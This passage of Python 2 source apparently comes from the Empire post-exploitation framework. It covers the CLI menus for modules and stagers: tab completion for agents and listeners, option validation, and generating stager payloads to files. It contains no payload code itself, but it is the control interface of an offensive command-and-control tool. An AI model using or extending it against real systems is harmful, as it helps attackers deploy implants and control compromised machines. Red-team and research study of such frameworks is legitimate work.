            # resolve the passed name to a sessionID
            sessionID = self.mainMenu.agents.get_agent_id_db(name)

            agent_menu = AgentMenu(self.mainMenu, sessionID)
        else:
            print helpers.color("[!] Please enter a valid agent name")


    def complete_set(self, text, line, begidx, endidx):
        "Tab-complete a module option to set."

        options = self.module.options.keys()

        if line.split(' ')[1].lower() == "agent":
            # if we're tab-completing "agent", return the agent names
            agentNames = self.mainMenu.agents.get_agent_names_db() + ["all", "autorun"]
            end_line = ' '.join(line.split(' ')[1:])

            mline = end_line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in agentNames if s.startswith(mline)]

        elif line.split(' ')[1].lower() == "listener":
            # if we're tab-completing a listener name, return all the names
            listenerNames = self.mainMenu.listeners.get_listener_names()
            end_line = ' '.join(line.split(' ')[1:])
            mline = end_line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in listenerNames if s.startswith(mline)]

        elif line.split(' ')[1].lower().endswith("path"):
            return helpers.complete_path(text, line, arg=True)

        elif line.split(' ')[1].lower().endswith("file"):
            return helpers.complete_path(text, line, arg=True)

        elif line.split(' ')[1].lower().endswith("host"):
            return [helpers.lhost()]

        elif line.split(' ')[1].lower().endswith("language"):
            languages = ['powershell', 'python']
            end_line = ' '.join(line.split(' ')[1:])
            mline = end_line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in languages if s.startswith(mline)]

        # otherwise we're tab-completing an option name
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_unset(self, text, line, begidx, endidx):
        "Tab-complete a module option to unset."

        options = self.module.options.keys() + ["all"]

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_usemodule(self, text, line, begidx, endidx):
        "Tab-complete an Empire PowerShell module path."
        return self.mainMenu.complete_usemodule(text, line, begidx, endidx)


    def complete_creds(self, text, line, begidx, endidx):
        "Tab-complete 'creds' commands."
        return self.mainMenu.complete_creds(text, line, begidx, endidx)


    def complete_interact(self, text, line, begidx, endidx):
        "Tab-complete an interact command"

        names = self.mainMenu.agents.get_agent_names_db()

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]


class StagerMenu(cmd.Cmd):
    """
    The main class used by Empire to drive the 'stager' menu.
    """
    def __init__(self, mainMenu, stagerName, listener=None):
        cmd.Cmd.__init__(self)
        self.doc_header = 'Stager Menu'

        self.mainMenu = mainMenu

        # get the current stager name
        self.stagerName = stagerName
        self.stager = self.mainMenu.stagers.stagers[stagerName]

        # set the prompt text
        self.prompt = '(Empire: ' + helpers.color("stager/" + self.stagerName, color="blue") + ') > '

        # if this menu is being called from an listener menu
        if listener:
            # resolve the listener ID to a name, if applicable
            listener = self.mainMenu.listeners.get_listener(listener)
            self.stager.options['Listener']['Value'] = listener


    def validate_options(self):
        "Make sure all required stager options are completed."

        for option, values in self.stager.options.iteritems():
            if values['Required'] and ((not values['Value']) or (values['Value'] == '')):
                print helpers.color("[!] Error: Required stager option missing.")
                return False

        listenerName = self.stager.options['Listener']['Value']

        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            print helpers.color("[!] Invalid listener ID or name.")
            return False

        return True


    def emptyline(self):
        pass


    # print a nicely formatted help menu
    # stolen/adapted from recon-ng
    def print_topics(self, header, commands, cmdlen, maxcol):
        if commands:
            self.stdout.write("%s\n" % str(header))
            if self.ruler:
                self.stdout.write("%s\n" % str(self.ruler * len(header)))
            for command in commands:
                self.stdout.write("%s %s\n" % (command.ljust(17), getattr(self, 'do_' + command).__doc__))
            self.stdout.write("\n")


    def do_back(self, line):
        "Go back a menu."
        return True


    def do_agents(self, line):
        "Jump to the Agents menu."
        raise NavAgents()


    def do_listeners(self, line):
        "Jump to the listeners menu."
        raise NavListeners()


    def do_main(self, line):
        "Go back to the main menu."
        raise NavMain()


    def do_exit(self, line):
        "Exit Empire."
        raise KeyboardInterrupt


    def do_list(self, line):
        "Lists all active agents (or listeners)."

        if line.lower().startswith("listeners"):
            self.mainMenu.do_list("listeners " + str(' '.join(line.split(' ')[1:])))
        elif line.lower().startswith("agents"):
            self.mainMenu.do_list("agents " + str(' '.join(line.split(' ')[1:])))
        else:
            print helpers.color("[!] Please use 'list [agents/listeners] <modifier>'.")


    def do_info(self, line):
        "Display stager options."
        messages.display_stager(self.stager)


    def do_options(self, line):
        "Display stager options."
        messages.display_stager(self.stager)


    def do_set(self, line):
        "Set a stager option."

        parts = line.split()

        try:
            option = parts[0]
            if option not in self.stager.options:
                print helpers.color("[!] Invalid option specified.")

            elif len(parts) == 1:
                # "set OPTION"
                # check if we're setting a switch
                if self.stager.options[option]['Description'].startswith("Switch."):
                    self.stager.options[option]['Value'] = "True"
                else:
                    print helpers.color("[!] Please specify an option value.")
            else:
                # otherwise "set OPTION VALUE"
                option = parts[0]
                value = ' '.join(parts[1:])

                if value == '""' or value == "''":
                    value = ""

                self.stager.options[option]['Value'] = value
        except:
            print helpers.color("[!] Error in setting option, likely invalid option name.")


    def do_unset(self, line):
        "Unset a stager option."

        option = line.split()[0]

        if line.lower() == "all":
            for option in self.stager.options:
                self.stager.options[option]['Value'] = ''
        if option not in self.stager.options:
            print helpers.color("[!] Invalid option specified.")
        else:
            self.stager.options[option]['Value'] = ''


    def do_generate(self, line):
        "Generate/execute the given Empire stager."

        if not self.validate_options():
            return

        stagerOutput = self.stager.generate()

        savePath = ''
        if 'OutFile' in self.stager.options:
            savePath = self.stager.options['OutFile']['Value']

        if savePath != '':
            # make the base directory if it doesn't exist
            if not os.path.exists(os.path.dirname(savePath)) and os.path.dirname(savePath) != '':
                os.makedirs(os.path.dirname(savePath))

            # if we need to write binary output for a .dll
            if ".dll" in savePath:
                out_file = open(savePath, 'wb')
                out_file.write(bytearray(stagerOutput))
                out_file.close()
            else:
                # otherwise normal output
                out_file = open(savePath, 'w')
                out_file.write(stagerOutput)
                out_file.close()

            # if this is a bash script, make it executable
            if ".sh" in savePath:
                os.chmod(savePath, 777)

            print "\n" + helpers.color("[*] Stager output written out to: %s\n" % (savePath))

        else:
            print stagerOutput


    def do_execute(self, line):
        "Generate/execute the given Empire stager."
        self.do_generate(line)


    def do_interact(self, line):
        "Interact with a particular agent."

        name = line.strip()

        if name != "" and self.mainMenu.agents.is_agent_present(name):
            # resolve the passed name to a sessionID
            sessionID = self.mainMenu.agents.get_agent_id_db(name)

            agent_menu = AgentMenu(self.mainMenu, sessionID)
        else:
            print helpers.color("[!] Please enter a valid agent name")


    def complete_set(self, text, line, begidx, endidx):
        "Tab-complete a stager option to set."

        options = self.stager.options.keys()

        if line.split(' ')[1].lower() == "listener":
            # if we're tab-completing a listener name, return all the names
            listenerNames = self.mainMenu.listeners.get_listener_names()
            end_line = ' '.join(line.split(' ')[1:])

            mline = end_line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in listenerNames if s.startswith(mline)]
        elif line.split(' ')[1].lower().endswith("language"):
            languages = ['powershell', 'python']
            end_line = ' '.join(line.split(' ')[1:])
            mline = end_line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in languages if s.startswith(mline)]

        elif line.split(' ')[1].lower().endswith("path"):
            # tab-complete any stager option that ends with 'path'
            return helpers.complete_path(text, line, arg=True)

        # otherwise we're tab-completing an option name
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_unset(self, text, line, begidx, endidx):
        "Tab-complete a stager option to unset."

        options = self.stager.options.keys() + ["all"]

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]


    def complete_interact(self, text, line, begidx, endidx):
        "Tab-complete an interact command"

        names = self.mainMenu.agents.get_agent_names_db()

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]
